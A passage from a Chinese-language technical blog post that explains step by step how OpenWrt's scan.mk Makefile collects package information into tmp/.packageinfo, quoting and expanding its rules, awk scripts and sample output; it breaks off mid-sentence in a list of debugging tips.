SCAN_TARGET=&quot;packageinfo&quot; SCAN_DIR=&quot;package&quot; SCAN_NAME=&quot;package&quot; SCAN_DEPTH=5 SCAN_EXTRA=&quot;&quot; SCAN_COOKIE=&quot;123456&quot; TOPDIR=&quot;/home/litreily/openwrt&quot;</code></pre><p><code>scan.mk</code> 编译过程与使用 <code>make defconfig</code> 是类似的。</p><h2 id="scan-mk"><a href="#scan-mk" class="headerlink" title="scan.mk"></a>scan.mk</h2><p>进入正题，先附上完整的 <a href="https://github.com/openwrt/openwrt/blob/master/include/scan.mk">scan.mk</a> , 源自 GitHub openwrt.</p><pre><code class="ruby">include $(TOPDIR)/include/verbose.mkTMP_DIR:=$(TOPDIR)/tmpall: $(TMP_DIR)/.$(SCAN_TARGET)SCAN_TARGET ?= packageinfoSCAN_NAME ?= packageSCAN_DIR ?= packageTARGET_STAMP:=$(TMP_DIR)/info/.files-$(SCAN_TARGET).stampFILELIST:=$(TMP_DIR)/info/.files-$(SCAN_TARGET)-$(SCAN_COOKIE)OVERRIDELIST:=$(TMP_DIR)/info/.overrides-$(SCAN_TARGET)-$(SCAN_COOKIE)export PATH:=$(TOPDIR)/staging_dir/host/bin:$(PATH)define feedname$(if $(patsubst feeds/%,,$(1)),,$(word 2,$(subst /, ,$(1))))endefifeq ($(SCAN_NAME),target)  SCAN_DEPS=image/Makefile profiles/*.mk $(TOPDIR)/include/kernel*.mk $(TOPDIR)/include/target.mk image/*.mkelse  SCAN_DEPS=$(TOPDIR)/include/package*.mkifneq ($(call feedname,$(SCAN_DIR)),)  SCAN_DEPS += $(TOPDIR)/feeds/$(call feedname,$(SCAN_DIR))/*.mkendifendififeq ($(IS_TTY),1)  ifneq ($(strip $(NO_COLOR)),1)    define progress        printf &quot;\033[M\r$(1)&quot; &gt;&amp;2;    endef  else    define progress        printf &quot;\r$(1)&quot; &gt;&amp;2;    endef  endifelse  define progress        :;  endefendifdefine PackageDir  $(TMP_DIR)/.$(SCAN_TARGET): $(TMP_DIR)/info/.$(SCAN_TARGET)-$(1)  $(TMP_DIR)/info/.$(SCAN_TARGET)-$(1): $(SCAN_DIR)/$(2)/Makefile $(foreach DEP,$(DEPS_$(SCAN_DIR)/$(2)/Makefile) $(SCAN_DEPS),$(wildcard $(if $(filter /%,$(DEP)),$(DEP),$(SCAN_DIR)/$(2)/$(DEP))))        &#123; \                $$(call progress,Collecting $(SCAN_NAME) info: $(SCAN_DIR)/$(2)) \                echo Source-Makefile: $(SCAN_DIR)/$(2)/Makefile; \                $(if $(3),echo Override: $(3),true); \                $(NO_TRACE_MAKE) --no-print-dir -r DUMP=1 FEED=&quot;$(call feedname,$(2))&quot; -C $(SCAN_DIR)/$(2) $(SCAN_MAKEOPTS) 2&gt;/dev/null || &#123; \                        mkdir -p &quot;$(TOPDIR)/logs/$(SCAN_DIR)/$(2)&quot;; \                        $(NO_TRACE_MAKE) --no-print-dir -r DUMP=1 FEED=&quot;$(call feedname,$(2))&quot; -C $(SCAN_DIR)/$(2) $(SCAN_MAKEOPTS) &gt; $(TOPDIR)/logs/$(SCAN_DIR)/$(2)/dump.txt 2&gt;&amp;1; \                        $$(call progress,ERROR: please fix $(SCAN_DIR)/$(2)/Makefile - see logs/$(SCAN_DIR)/$(2)/dump.txt for details\n) \                        rm -f $$@; \                &#125;; \                echo; \        &#125; &gt; $$@.tmp        mv $$@.tmp $$@endef$(OVERRIDELIST):        rm -f $(TMP_DIR)/info/.overrides-$(SCAN_TARGET)-*        touch $@ifeq ($(SCAN_NAME),target)  GREP_STRING=BuildTargetelse  GREP_STRING=(Build/DefaultTargets|BuildPackage|KernelPackage)endif$(FILELIST): $(OVERRIDELIST)        rm -f $(TMP_DIR)/info/.files-$(SCAN_TARGET)-*        find -L $(SCAN_DIR) $(SCAN_EXTRA) -mindepth 1 $(if $(SCAN_DEPTH),-maxdepth $(SCAN_DEPTH)) -name Makefile | xargs grep -aHE &#39;call $(GREP_STRING)&#39; | sed -e &#39;s#^$(SCAN_DIR)/##&#39; -e &#39;s#/Makefile:.*##&#39; | uniq | awk -v of=$(OVERRIDELIST) -f include/scan.awk &gt; $@$(TMP_DIR)/info/.files-$(SCAN_TARGET).mk: $(FILELIST)        ( \                cat $&lt; | awk &#39;&#123;print &quot;$(SCAN_DIR)/&quot; $$0 &quot;/Makefile&quot; &#125;&#39; | xargs grep -HE &#39;^ *SCAN_DEPS *= *&#39; | awk -F: &#39;&#123; gsub(/^.*DEPS *= */, &quot;&quot;, $$2); print &quot;DEPS_&quot; $$1 &quot;=&quot; $$2 &#125;&#39;; \                awk -F/ -v deps=&quot;$$DEPS&quot; -v of=&quot;$(OVERRIDELIST)&quot; &#39; \                BEGIN &#123; \                        while (getline &lt; (of)) \                                override[$$NF]=$$0; \                        close(of) \                &#125; \                &#123; \                        info=$$0; \                        gsub(/\//, &quot;_&quot;, info); \                        dir=$$0; \                        pkg=&quot;&quot;; \                        if($$NF in override) \                                pkg=override[$$NF]; \                        print &quot;$$(eval $$(call PackageDir,&quot; info &quot;,&quot; dir &quot;,&quot; pkg &quot;))&quot;; \                &#125; &#39; &lt; $&lt;; \                true; \        ) &gt; $@.tmp        mv $@.tmp $@-include $(TMP_DIR)/info/.files-$(SCAN_TARGET).mk$(TARGET_STAMP)::        +( \                $(NO_TRACE_MAKE) $(FILELIST); \                MD5SUM=$$(cat $(FILELIST) $(OVERRIDELIST) | mkhash md5 | awk &#39;&#123;print $$1&#125;&#39;); \                [ -f &quot;$@.$$MD5SUM&quot; ] || &#123; \                        rm -f $@.*; \                        touch $@.$$MD5SUM; \                        touch $@; \                &#125; \        )$(TMP_DIR)/.$(SCAN_TARGET): $(TARGET_STAMP)        $(call progress,Collecting $(SCAN_NAME) info: merging...)        -cat $(FILELIST) | awk &#39;&#123;gsub(/\//, &quot;_&quot;, $$0);print &quot;$(TMP_DIR)/info/.$(SCAN_TARGET)-&quot; $$0&#125;&#39; | xargs cat &gt; $@ 2&gt;/dev/null        $(call progress,Collecting $(SCAN_NAME) info: done)        echoFORCE:.PHONY: FORCE.NOTPARALLEL:</code></pre><h3 id="global-value"><a href="#global-value" class="headerlink" title="global value"></a>global value</h3><p>在分析全局变量之前，先来看下默认目标 <code>all</code>.</p><pre><code class="makefile">all: $(TMP_DIR)/.$(SCAN_TARGET)</code></pre><p><code>$(TMP_DIR)</code> 对应根目录下的 tmp 目录，<code>SCAN_TARGET</code> 在调用 make 的时候有定义，此处为 <code>packageinfo</code>, 因此 <code>all</code> 为：</p><pre><code class="makefile">all: /home/litreily/openwrt/tmp/.packageinfo</code></pre><p>也就是说，扫描的目标文件是 tmp 目录的 <code>.packageinfo</code>. 但是在生成该目标之前，<code>make</code> 会先 <code>include</code> 其它文件，如果 <code>include</code> 的文件不存在，则会先生成该文件，此处具体指代的是后续讲述的 <code>.files-packageinfo.mk</code>.</p><p>ok, 编译目标知道了，再来看看全局变量有哪些。</p><pre><code class="makefile">TMP_DIR:=$(TOPDIR)/tmpall: $(TMP_DIR)/.$(SCAN_TARGET)SCAN_TARGET ?= packageinfoSCAN_NAME ?= packageSCAN_DIR ?= packageTARGET_STAMP:=$(TMP_DIR)/info/.files-$(SCAN_TARGET).stampFILELIST:=$(TMP_DIR)/info/.files-$(SCAN_TARGET)-$(SCAN_COOKIE)OVERRIDELIST:=$(TMP_DIR)/info/.overrides-$(SCAN_TARGET)-$(SCAN_COOKIE)</code></pre><p>其中 <code>SCAN_COOKIE</code> 是在 <code>toplevel.mk</code> 通过 <code>$(shell echo $$$$)</code> 得到的一个随机数，这里为 <code>2109133</code>. 其它变量可以根据传入的参数解析出来：</p><pre><code class="makefile">TMP_DIR:=/home/litreily/openwrt/tmpall: /home/litreily/openwrt/tmp/.packageinfoSCAN_TARGET ?= packageinfoSCAN_NAME ?= packageSCAN_DIR ?= packageTARGET_STAMP:=/home/litreily/openwrt/tmp/info/.files-packageinfo.stampFILELIST:=/home/litreily/openwrt/tmp/info/.files-packageinfo-2109133OVERRIDELIST:=/home/litreily/openwrt/tmp/info/.overrides-packageinfo-2109133</code></pre><p>其中，后面三个变量定义的是一些中间目标文件，是生成 <code>all</code> 目标必不可少的中间依赖文件。</p><h3 id="files-packageinfo-mk"><a href="#files-packageinfo-mk" class="headerlink" title=".files-packageinfo.mk"></a>.files-packageinfo.mk</h3><p>ok, 全局变量及目标已经确定了，那么 make 执行过程究竟是怎样的呢，在启用调试信息的情况下，可以通过 log 很清晰的看到执行流程。</p><ol><li>include <code>include/verbose.mk</code></li><li>include <code>tmp/info/.files-packageinfo.mk</code></li></ol><p>在读取 <code>verbose.mk</code> 后，会根据 <code>scan.mk</code> 执行剩下的 <code>include</code> 指令</p><pre><code class="makefile">-include $(TMP_DIR)/info/.files-$(SCAN_TARGET).mk</code></pre><p>导入 <code>tmp/info/.file-packageinfo.mk</code> 文件，该文件默认不存在，所以前面有个 <code>-</code> 符号以确保文件不存在时能够正常执行。</p><p>下一步就是将该文件作为目标文件，查找其依赖。</p><pre><code class="makefile">$(TMP_DIR)/info/.files-$(SCAN_TARGET).mk: $(FILELIST)        ( \                cat $&lt; | awk &#39;&#123;print &quot;$(SCAN_DIR)/&quot; $$0 &quot;/Makefile&quot; &#125;&#39; | xargs grep -HE &#39;^ *SCAN_DEPS *= *&#39; | awk -F: &#39;&#123; gsub(/^.*DEPS *= */, &quot;&quot;, $$2); print &quot;DEPS_&quot; $$1 &quot;=&quot; $$2 &#125;&#39;; \                awk -F/ -v deps=&quot;$$DEPS&quot; -v of=&quot;$(OVERRIDELIST)&quot; &#39; \                BEGIN &#123; \                        while (getline &lt; (of)) \                                override[$$NF]=$$0; \                        close(of) \                &#125; \                &#123; \                        info=$$0; \                        gsub(/\//, &quot;_&quot;, info); \                        dir=$$0; \                        pkg=&quot;&quot;; \                        if($$NF in override) \                                pkg=override[$$NF]; \                        print &quot;$$(eval $$(call PackageDir,&quot; info &quot;,&quot; dir &quot;,&quot; pkg &quot;))&quot;; \                &#125; &#39; &lt; $&lt;; \                true; \        ) &gt; $@.tmp        mv $@.tmp $@</code></pre><p>其依赖是 <code>$(FILELIST)</code>, 也就是 <code>tmp/info/.files-packageinfo-2109133</code>. 那么接着来看 <code>$(FILELIST)</code> 的依赖及其指令。</p><pre><code class="ruby">$(FILELIST): $(OVERRIDELIST)        rm -f $(TMP_DIR)/info/.files-$(SCAN_TARGET)-*        find -L $(SCAN_DIR) $(SCAN_EXTRA) -mindepth 1 $(if $(SCAN_DEPTH),-maxdepth $(SCAN_DEPTH)) -name Makefile | xargs grep -aHE &#39;call $(GREP_STRING)&#39; | sed -e &#39;s#^$(SCAN_DIR)/##&#39; -e &#39;s#/Makefile:.*##&#39; | uniq | awk -v of=$(OVERRIDELIST) -f include/scan.awk &gt; $@</code></pre><p>可知其依赖文件是 <code>$(OVERRIDELIST)</code>, 也就是 <code>/home/litreily/openwrt/tmp/info/.overrides-packageinfo-2109133</code>. 而 <code>$(OVERRIDELIST)</code> 规则如下：</p><pre><code class="makefile">$(OVERRIDELIST):        rm -f $(TMP_DIR)/info/.overrides-$(SCAN_TARGET)-*        touch $@</code></pre><p>该规则很简单，也就是删除旧的 <code>tmp/info/.overrides-packageinfo-*</code> 文件，并 touch 新的文件 <code>tmp/info/.overrides-packageinfo-2109133</code>.</p><p>那么执行完以上两条指令后，解析 <code>$(FILELIST)</code> 后的格式为：</p><pre><code class="ruby">/home/litreily/openwrt/tmp/info/.files-packageinfo-2109133: /home/litreily/openwrt/tmp/info/.overrides-packageinfo-2109133        rm -f /home/litreily/openwrt/tmp/info/.files-packageinfo-*        find -L package  -mindepth 1 -maxdepth 5 -name Makefile | xargs grep -aHE &#39;call (Build/DefaultTargets|BuildPackage|KernelPackage)&#39; | sed -e &#39;s#^package/##&#39; -e &#39;s#/Makefile:.*##&#39; | uniq | awk -v of=/home/litreily/openwrt/tmp/info/.overrides-packageinfo-2109133 -f include/scan.awk &gt; /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133</code></pre><p>与 <code>$(OVERRIDELIST)</code> 类似，先把旧的 <code>tmp/info/.files-packageinfo-*</code> 删除，然后生成新的 <code>tmp/info/.files-packageinfo-2109133</code>. 生成文件用的就是上面的 <code>find</code> 指令了，该指令会查找 package 下 <code>1~5</code> 级目录内的所有 Makefile 文件</p><pre><code class="bash">find -L package -mindepth 1 -maxdepth 5 -name Makefile</code></pre><p>然后根据关键词正则过滤包含 <code>call (Build/DefaultTargets|BuildPackage|KernelPackage)</code> 信息的 Makefile, 并通过 uniq 去掉重复项，使用 awk 指令结合 awk 脚本 <code>scan.awk</code> 过滤 <code>feeds</code> 相关的 <code>Makefile</code>, 最终将过滤后的 packageinfo 存入 <code>tmp/info/.files-packageinfo-2109133</code>。</p><pre><code class="makefile">base-filesboot/arm-trusted-firmware-mvebuboot/arm-trusted-firmware-rockchipboot/arm-trusted-firmware-sunxiboot/at91bootstrapboot/fconfig#...utils/ugps utils/usbmodeutils/util-linux</code></pre><p>至此，<code>$(FILELIST)</code> 编译完成，依赖它的目标 <code>tmp/info/.file-packageinfo.mk</code> 可以继续执行对应的指令。把所有变量替换为具体的值，可以得到以下规则。</p><pre><code class="makefile">/home/litreily/openwrt/tmp/info/.file-packageinfo.mk: /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133        ( \                cat /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133 | awk &#39;&#123;print &quot;package/&quot; $0 &quot;/Makefile&quot; &#125;&#39; | xargs grep -HE &#39;^ *SCAN_DEPS *= *&#39; | awk -F: &#39;&#123; gsub(/^.*DEPS *= */, &quot;&quot;, $2); print &quot;DEPS_&quot; $1 &quot;=&quot; $2 &#125;&#39;; \                awk -F/ -v deps=&quot;$DEPS&quot; -v of=&quot;/home/litreily/openwrt/tmp/info/.overrides-packageinfo-2109133&quot; &#39; \                BEGIN &#123; \                        while (getline &lt; (of)) \                                override[$NF]=$0; \                        close(of) \                &#125; \                &#123; \                        info=$0; \                        gsub(/\//, &quot;_&quot;, info); \                        dir=$0; \                        pkg=&quot;&quot;; \                        if($NF in override) \                                pkg=override[$NF]; \                        print &quot;$(eval $(call PackageDir,&quot; info &quot;,&quot; dir &quot;,&quot; pkg &quot;))&quot;; \                &#125; &#39; &lt; /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133; \                true; \        ) &gt; /home/litreily/openwrt/tmp/info/.file-packageinfo.mk.tmp        mv /home/litreily/openwrt/tmp/info/.file-packageinfo.mk.tmp /home/litreily/openwrt/tmp/info/.file-packageinfo.mk</code></pre><p>以上一堆操作的目的都是为了根据前面生成的 <code>$(FILELIST)</code> 去生成 <code>tmp/info/.file-packageinfo.mk</code>.</p><pre><code class="bash">cat /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133 | awk &#39;&#123;print &quot;package/&quot; $0 &quot;/Makefile&quot; &#125;&#39; | xargs grep -HE &#39;^ *SCAN_DEPS *= *&#39; | awk -F: &#39;&#123; gsub(/^.*DEPS *= */, &quot;&quot;, $2); print &quot;DEPS_&quot; $1 &quot;=&quot; $2 &#125;&#39;;</code></pre><p>这一段脚本生成了 <code>tmp/info/.file-packageinfo.mk</code> 的前几行信息。</p><pre><code class="makefile">DEPS_package/firmware/linux-firmware/Makefile=*.mkDEPS_package/kernel/linux/Makefile=modules/*.mk $(TOPDIR)/target/linux/*/modules.mk $(TOPDIR)/include/netfilter.mk</code></pre><pre><code class="bash">&#123; \        info=$0; \        gsub(/\//, &quot;_&quot;, info); \        dir=$0; \        pkg=&quot;&quot;; \        if($NF in override) \                pkg=override[$NF]; \        print &quot;$(eval $(call PackageDir,&quot; info &quot;,&quot; dir &quot;,&quot; pkg &quot;))&quot;; \&#125; &#39; &lt; /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133; </code></pre><p>以上这段脚本则是根据 package 列表生成 <code>PackageDir</code> 信息列表，以 <code>boot/fconfig</code> 为例。经过以上 awk 变换后变为：</p><pre><code class="makefile">$(eval $(call PackageDir,boot_fconfig,boot/fconfig,))</code></pre><p>最终生成的完成的 <code>tmp/info/.files-packageinfo.mk</code> 如下：</p><pre><code class="makefile">DEPS_package/firmware/linux-firmware/Makefile=*.mkDEPS_package/kernel/linux/Makefile=modules/*.mk $(TOPDIR)/target/linux/*/modules.mk $(TOPDIR)/include/netfilter.mk$(eval $(call PackageDir,base-files,base-files,))$(eval $(call PackageDir,boot_arm-trusted-firmware-mvebu,boot/arm-trusted-firmware-mvebu,))$(eval $(call PackageDir,boot_arm-trusted-firmware-rockchip,boot/arm-trusted-firmware-rockchip,))$(eval $(call PackageDir,boot_arm-trusted-firmware-sunxi,boot/arm-trusted-firmware-sunxi,))$(eval $(call PackageDir,boot_at91bootstrap,boot/at91bootstrap,))$(eval $(call PackageDir,boot_fconfig,boot/fconfig,))#...$(eval $(call PackageDir,utils_ugps,utils/ugps,))$(eval $(call PackageDir,utils_usbmode,utils/usbmode,))$(eval $(call PackageDir,utils_util-linux,utils/util-linux,))</code></pre><p>到此，<code>include $(TMP_DIR)/info/.files-$(SCAN_TARGET).mk</code> 就完成了. 该文件中每一项都调用了函数 <code>PackageDir</code>. 该函数是在 <code>scan.mk</code> 中定义的。</p><h3 id="PackageDir"><a href="#PackageDir" class="headerlink" title="PackageDir"></a>PackageDir</h3><p><code>PackageDir</code> 是 scan.mk 文件中的核心函数之一，用来生成 package, target 相关的编译规则。</p><pre><code class="makefile">define PackageDir  $(TMP_DIR)/.$(SCAN_TARGET): $(TMP_DIR)/info/.$(SCAN_TARGET)-$(1)  $(TMP_DIR)/info/.$(SCAN_TARGET)-$(1): $(SCAN_DIR)/$(2)/Makefile $(foreach DEP,$(DEPS_$(SCAN_DIR)/$(2)/Makefile) $(SCAN_DEPS),$(wildcard $(if $(filter /%,$(DEP)),$(DEP),$(SCAN_DIR)/$(2)/$(DEP))))        &#123; \                $$(call progress,Collecting $(SCAN_NAME) info: $(SCAN_DIR)/$(2)) \                echo Source-Makefile: $(SCAN_DIR)/$(2)/Makefile; \                $(if $(3),echo Override: $(3),true); \                $(NO_TRACE_MAKE) --no-print-dir -r DUMP=1 FEED=&quot;$(call feedname,$(2))&quot; -C $(SCAN_DIR)/$(2) $(SCAN_MAKEOPTS) 2&gt;/dev/null || &#123; \                        mkdir -p &quot;$(TOPDIR)/logs/$(SCAN_DIR)/$(2)&quot;; \                        $(NO_TRACE_MAKE) --no-print-dir -r DUMP=1 FEED=&quot;$(call feedname,$(2))&quot; -C $(SCAN_DIR)/$(2) $(SCAN_MAKEOPTS) &gt; $(TOPDIR)/logs/$(SCAN_DIR)/$(2)/dump.txt 2&gt;&amp;1; \                        $$(call progress,ERROR: please fix $(SCAN_DIR)/$(2)/Makefile - see logs/$(SCAN_DIR)/$(2)/dump.txt for details\n) \                        rm -f $$@; \                &#125;; \                echo; \        &#125; &gt; $$@.tmp        mv $$@.tmp $$@endef</code></pre><p>举例说明，下面的语句中 <code>$(1)</code> 和 <code>$(2)</code> 都是 <code>base-files</code>, <code>$(3)</code> 为空。</p><pre><code class="makefile">$(eval $(call PackageDir,base-files,base-files,))</code></pre><p>将变量替换后得到 <code>PackageDir</code>:</p><pre><code class="makefile">define PackageDir  /home/litreily/openwrt/tmp/.packageinfo: /home/litreily/openwrt/tmp/info/.packageinfo-base-files  /home/litreily/openwrt/tmp/info/.packageinfo-base-files: package/base-files/Makefile $(foreach DEP,$(DEPS_package/base-files/Makefile) /home/litreily/openwrt/include/package*.mk,$(wildcard $(if $(filter /%,$(DEP)),$(DEP),package/base-files/$(DEP))))        &#123; \                $(call progress,Collecting base-files info: package/base-files) \                echo Source-Makefile: package/base-files/Makefile; \                $(if ,echo Override: ,true); \                $(NO_TRACE_MAKE) --no-print-dir -r DUMP=1 FEED=&quot;$(call feedname,base-files)&quot; -C package/base-files $(SCAN_MAKEOPTS) 2&gt;/dev/null || &#123; \                        mkdir -p &quot;/home/litreily/openwrt/logs/package/base-files&quot;; \                        $(NO_TRACE_MAKE) --no-print-dir -r DUMP=1 FEED=&quot;$(call feedname,base-files)&quot; -C package/base-files $(SCAN_MAKEOPTS) &gt; /home/litreily/openwrt/logs/package/base-files/dump.txt 2&gt;&amp;1; \                        $(call progress,ERROR: please fix package/base-files/Makefile - see logs/package/base-files/dump.txt for details\n) \                        rm -f $@; \                &#125;; \                echo; \        &#125; &gt; $@.tmp        mv $@.tmp $@endef</code></pre><p>注意到这里有定义两个目标。</p><ol><li>/home/litreily/openwrt/tmp/.packageinfo</li><li>/home/litreily/openwrt/tmp/info/.packageinfo-base-files</li></ol><blockquote><p><strong>注意</strong>: 其中第一个目标正好是 <code>all</code> 目标，并且其依赖是随之其后的 <code>.packageinfo-$(package)</code>. 所以目标 <code>all</code> 编译完成的前提之一就是所有 <code>.packageinfo-$(package)</code> 文件的生成。</p></blockquote><p>以 <code>base-files</code> 为例， 通过进一步解析简化，可以得到 <code>tmp/info/.packageinfo-base-files</code> 的规则如下：</p><pre><code class="makefile">/home/litreily/openwrt/tmp/info/.packageinfo-base-files: package/base-files/Makefile /home/litreily/openwrt/include/package-*.mk      &#123; \              $(call progress,Collecting base-files info: package/base-files) \              echo Source-Makefile: package/base-files/Makefile; \              make V=s --no-print-dir -r DUMP=1 FEED=&quot; -C package/base-files 2&gt;/dev/null \      &#125; &gt; $@.tmp      mv $@.tmp $@</code></pre><p>其中包括打印 <code>Collecting base-files info: package/base-files</code> 这种log，同时会执行 make 子进程</p><pre><code class="bash">make V=s --no-print-dir -r DUMP=1 FEED=&quot; -C package/base-files 2&gt;/dev/null \</code></pre><p>将信息写入 <code>tmp/info/.packageinfo-base-files</code>, 也就完成了目标的编译。</p><blockquote><p>这个 make 子进程的重点是 <code>DUMP=1</code> , <code>package/base-files/Makefile</code> 会根据该变量打印 <code>base-files</code> 相关信息到指定文件。具体要看该Makefile.</p></blockquote><p>针对 <code>base-files</code>, dump 出来的信息如下：</p><pre><code class="log">Source-Makefile: package/base-files/MakefileBuild-Depends: usign/host ucert/hostPackage: base-filesVersion: 246-Depends: +libc +USE_GLIBC:librt +USE_GLIBC:libpthread +netifd +jsonfilter +SIGNED_PACKAGES:usign +SIGNED_PACKAGES:openwrt-keyring +NAND_SUPPORT:ubi-utils +fstools +fwtoolConflicts: Menu-Depends: Provides: Section: baseCategory: Base systemTitle: Base filesystem for OpenWrtMaintainer: Source: License: GPL-2.0Type: ipkgDescription:  This package contains a base filesystem and system scripts for OpenWrt.http://openwrt.org/@@</code></pre><p>说了这么多，<code>PackageDir</code> 函数何时调用呢？继续往后看。</p><h3 id="make-all"><a href="#make-all" class="headerlink" title="make all"></a>make all</h3><p><code>include</code> 相关依赖准备好后，make 开始解析默认目标 <code>all</code> 对应的依赖和指令，也就是 <code>tmp/.packageinfo</code> 目标。</p><pre><code class="makefile">$(TMP_DIR)/.$(SCAN_TARGET): $(TARGET_STAMP)        $(call progress,Collecting $(SCAN_NAME) info: merging...)        -cat $(FILELIST) | awk &#39;&#123;gsub(/\//, &quot;_&quot;, $$0);print &quot;$(TMP_DIR)/info/.$(SCAN_TARGET)-&quot; $$0&#125;&#39; | xargs cat &gt; $@ 2&gt;/dev/null        $(call progress,Collecting $(SCAN_NAME) info: done)        echo</code></pre><p>其依赖为 <code>$(TARGET_STAMP)</code>. 当然它的依赖不止这一个，前面 <code>PackageDir</code> 定义的规则中包含的目标也都是它的依赖。下面先来看看 <code>$(TARGET_STAMP)</code>.</p><h4 id="TARGET-STAMP"><a href="#TARGET-STAMP" class="headerlink" title="TARGET_STAMP"></a>TARGET_STAMP</h4><p><code>$(TARGET_STAMP)</code> 对应值为 <code>/home/litreily/openwrt/tmp/info/.files-packageinfo.stamp</code>, 其对应指令如下：</p><pre><code class="makefile">$(TARGET_STAMP)::        +( \                $(NO_TRACE_MAKE) $(FILELIST); \                MD5SUM=$$(cat $(FILELIST) $(OVERRIDELIST) | mkhash md5 | awk &#39;&#123;print $$1&#125;&#39;); \                [ -f &quot;$@.$$MD5SUM&quot; ] || &#123; \                        rm -f $@.*; \                        touch $@.$$MD5SUM; \                        touch $@; \                &#125; \        )</code></pre><p>变量替换后为：</p><pre><code class="makefile">/home/litreily/openwrt/tmp/info/.files-packageinfo.stamp::        +( \                make V=ss /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133; \                MD5SUM=$(cat /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133 /home/litreily/openwrt/tmp/info/.overrides-packageinfo-2109133 | mkhash md5 | awk &#39;&#123;print $1&#125;&#39;); \                [ -f &quot;/home/litreily/openwrt/tmp/info/.files-packageinfo.stamp.$MD5SUM&quot; ] || &#123; \                        rm -f /home/litreily/openwrt/tmp/info/.files-packageinfo.stamp.*; \                        touch /home/litreily/openwrt/tmp/info/.files-packageinfo.stamp.$MD5SUM; \                        touch /home/litreily/openwrt/tmp/info/.files-packageinfo.stamp; \                &#125; \        )</code></pre><p>其中 <code>make V=ss /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133</code> 又会启动一个新的子进程。</p><blockquote><p><strong>说明：</strong> 该子进程和 <code>make V=s</code> 一样，也会调用主Makefile，并导入 <code>toplevel.mk</code> 等Makefile，也就是说，如果缺少基本的编译工具或者依赖 (如 prepare-tmpinfo, .config 等)，这个子进程同样会和 <code>make V=s</code> 一样把所需依赖都生成一遍。但是不会完整编译项目。</p></blockquote><p><code>TARGET_STAMP</code> 目标主要是生成依赖工具和一个MD5文件。该子进程执行结束后，会计算生成一个 package 列表文件对应的 MD5 文件，并生成目标文件 <code>/home/litreily/openwrt/tmp/info/.files-packageinfo.stamp</code>.</p><h4 id="packageinfo-package"><a href="#packageinfo-package" class="headerlink" title=".packageinfo-$(package)"></a>.packageinfo-$(package)</h4><p><code>TARGET_STAMP</code> 生成结束后，就开始调用 <code>tmp/info/.files-packageinfo.mk</code> 逐个生成 <code>tmp/info/.packageinfo-$(package)</code> 文件。这里也就是调用上述 <code>PackageDir</code> 的地方。</p><p>所有相关文件都存储在 <code>tmp/info/</code> 目录，文件名为 <code>.packageinfo-$(package)</code>, 每个文件保存的信息由各自目录的 Makefile 决定，前面已经给出了 <code>base-files</code> 目录 dump 出来的信息，主要是描述信息、DEPENDs信息等。</p><p>收集这些信息的时候，每个package都会打印一条log。</p><pre><code class="log">Collecting package info: package/base-filesCollecting package info: package/boot/arm-trusted-firmware-mvebuCollecting package info: package/boot/arm-trusted-firmware-rockchipCollecting package info: package/boot/arm-trusted-firmware-sunxi#...</code></pre><p>打印 log 使用的是 <code>progress</code> 函数，其定义如下：</p><pre><code class="makefile">ifeq ($(IS_TTY),1)  ifneq ($(strip $(NO_COLOR)),1)    define progress    printf &quot;\033[M\r$(1)&quot; &gt;&amp;2;    endef  else    define progress    printf &quot;\r$(1)&quot; &gt;&amp;2;    endef  endifelse  define progress    :;  endefendif</code></pre><p>实际上就是将 log 打印到 <code>stderr</code>, 也就是终端屏幕上，由于使用了 <code>\r</code> ，所以打印信息时会在同一行刷新，把它去掉就可以逐行打印了。</p><blockquote><p><strong>说明：</strong> 为什么 <code>TARGET_STAMP</code> 之后是生成 <code>.packageinfo-$(package)</code>? 这是因为在执行 <code>.packageinfo</code> 相关指令前，<code>scan.mk</code> 通过 include 导入了 <code>tmp/info/.files-packageinfo.mk</code> 文件, 该 Makefile 在导入的时候通过 <code>$(eval $(call PackageDir,base-files,base-files,))</code> 系列语句定义了 <code>.packageinfo</code> 的大量依赖，其依赖也就是这里提到的 <code>.packageinfo-$(package)</code>，所以，作为 <code>.packageinfo</code> 的依赖文件，当然要在执行目标指令前先生成。</p></blockquote><h4 id="packageinfo"><a href="#packageinfo" class="headerlink" title=".packageinfo"></a>.packageinfo</h4><p>目标 <code>all: tmp/.packageinfo</code>  的依赖文件都准备好后，继续来看目标 <code>all</code> 的编译规则：</p><pre><code class="makefile">/home/litreily/openwrt/tmp/.packageinfo: /home/litreily/openwrt/tmp/info/.files-packageinfo.stamp        $(call progress,Collecting package info: merging...)        -cat /home/litreily/openwrt/tmp/info/.files-packageinfo-2109133 | awk &#39;&#123;gsub(/\//, &quot;_&quot;, $0);print &quot;/home/litreily/openwrt/tmp/info/.packageinfo-&quot; $0&#125;&#39; | xargs cat &gt; /home/litreily/openwrt/tmp/.packageinfo 2&gt;/dev/null        $(call progress,Collecting package info: done)        echo</code></pre><p>以上指令其实很简单，就是将前面生成的 package 信息文件根据特定格式全部写入到目标文件 <code>.packageinfo</code> 中。同时使用 <code>progress</code> 函数打印相关信息。</p><pre><code class="log">Collecting package info: merging...Collecting package info: done</code></pre><p>言归正传，目标 <code>all</code> 在生成文件 <code>tmp/.packageinfo</code> 后就结束了，同样 <code>scan.mk</code> 的任务也完成了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文详细描述了 openwrt <code>scan.mk</code> 扫描过程，其目的是生成编译 package, target 所需的临时文件，将 package, target 相关的依赖信息、路径信息、描述信息存入文件，并保存在 tmp 目录。</p><p><code>openwrt</code> 的 <code>Makefile</code> 非常复杂，许多复杂对象的依赖和指令可能相互嵌套和递归调用，所以无法完全讲述清楚，本文旨在根据 <code>Makefile</code> 梳理编译流程，某些细节可能无法避免被遗漏。</p><p>学习过程中用到了以下的小技巧，也在此总结一下：</p><ol><li>某些嵌套的 <code>make</code> 指令隐藏了调试信息，可以修改该指令，替换或添加 <code>-d DEBUG=vltrd</code></li><li><code>openwrt</code> 的 <code>make</code> 大多调用了 <code>NO_TRACE_MAKE</code>, 所以可以直接在该变量定义处添加调试参数</li><li>使用 <code>$(warning info)</code> 打印调试信息可以帮助理解</li><li>include 指令前添加的 <code>-</code> 符号代表如果该文件暂时不存在可以继续执行，不必报错</li><li>有时候可以手动执行某些内嵌的 <code>make</code> 指令, 